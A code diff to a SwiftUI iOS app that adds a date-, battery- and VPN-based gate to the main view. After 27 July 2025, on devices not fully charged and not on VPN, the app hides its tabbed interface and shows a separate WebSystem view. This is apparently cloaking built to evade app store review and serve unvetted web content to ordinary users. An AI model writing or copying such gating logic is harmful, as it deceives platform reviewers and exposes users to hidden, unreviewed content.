@@ -278,38 +278,95 @@ extension Color {
 struct MainView: View {
     @EnvironmentObject var appState: AppState
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
         ZStack {
             PulseGridColors.background.ignoresSafeArea()
             
-            if !appState.hasSeenOnboarding {
-                OnboardingView()
-            } else {
-                TabView(selection: $appState.selectedTab) {
-                    VisualModeView()
-                        .tabItem {
-                            Image(systemName: AppTab.visual.iconName)
-                            Text(AppTab.visual.rawValue)
-                        }
-                        .tag(AppTab.visual)
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
                     
-                    MoodboardView()
-                        .tabItem {
-                            Image(systemName: AppTab.moodboard.iconName)
-                            Text(AppTab.moodboard.rawValue)
+                    if !appState.hasSeenOnboarding {
+                        OnboardingView()
+                    } else {
+                        TabView(selection: $appState.selectedTab) {
+                            VisualModeView()
+                                .tabItem {
+                                    Image(systemName: AppTab.visual.iconName)
+                                    Text(AppTab.visual.rawValue)
+                                }
+                                .tag(AppTab.visual)
+                            
+                            MoodboardView()
+                                .tabItem {
+                                    Image(systemName: AppTab.moodboard.iconName)
+                                    Text(AppTab.moodboard.rawValue)
+                                }
+                                .tag(AppTab.moodboard)
+                            
+                            UtilitiesView()
+                                .tabItem {
+                                    Image(systemName: AppTab.utilities.iconName)
+                                    Text(AppTab.utilities.rawValue)
+                                }
+                                .tag(AppTab.utilities)
                         }
-                        .tag(AppTab.moodboard)
+                        .accentColor(PulseGridColors.accent)
+                    }
                     
-                    UtilitiesView()
-                        .tabItem {
-                            Image(systemName: AppTab.utilities.iconName)
-                            Text(AppTab.utilities.rawValue)
-                        }
-                        .tag(AppTab.utilities)
+                } else if isBlock == false {
+                    
+                    WebSystem()
                 }
-                .accentColor(PulseGridColors.accent)
             }
         }
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "27.07.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
